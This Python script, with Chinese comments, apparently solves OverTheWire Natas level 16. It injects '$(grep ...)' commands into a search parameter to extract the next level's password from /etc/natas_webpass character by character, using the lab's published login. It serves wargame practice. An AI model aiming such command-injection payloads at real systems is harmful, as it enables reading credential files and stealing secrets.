import requests

#步骤一，先过滤出有哪些字母数字
#步骤二，再对其排序

username = 'natas16'
password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
url = "http://natas16.natas.labs.overthewire.org"
pass_list = []
pass17 = ""
characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
#payload = "password $(grep -i " + 'characters' + " /etc/natas_pass/natas17)&submit=Search"
#GET /?needle=password&submit=Search
#拼接语句


#下面开始猜测可能的字母和数字。
for char in characters:
    payload = "needle=password$(grep " + char + " /etc/natas_webpass/natas17)&submit=Search"
    #password是作为搜索的单词，password和$之间不能有空格。
    req = requests.get(url=url,
                       auth=(username, password),
                       params=payload
                       )
    if 'password' not in req.text:
        print(char + " is in the password")
        pass_list += char

#下面开始组成密码
for l in range(1, 33):
#循环匹配1到32位。
    for c in pass_list:
        char += c
        payload = "needle=password$(grep ^" + char + " /etc/natas_webpass/natas17)&submit=Search"
        # ^ 符号表示从字符串的开头开始匹配。详见正则表达式的使用。
        req = requests.get(url=url,
                           auth=(username, password),
                           params=payload
                           )
        if 'password' not in req.text:
            pass17 = char
            print("password is " + pass17)
            break
        else:
            char = pass17
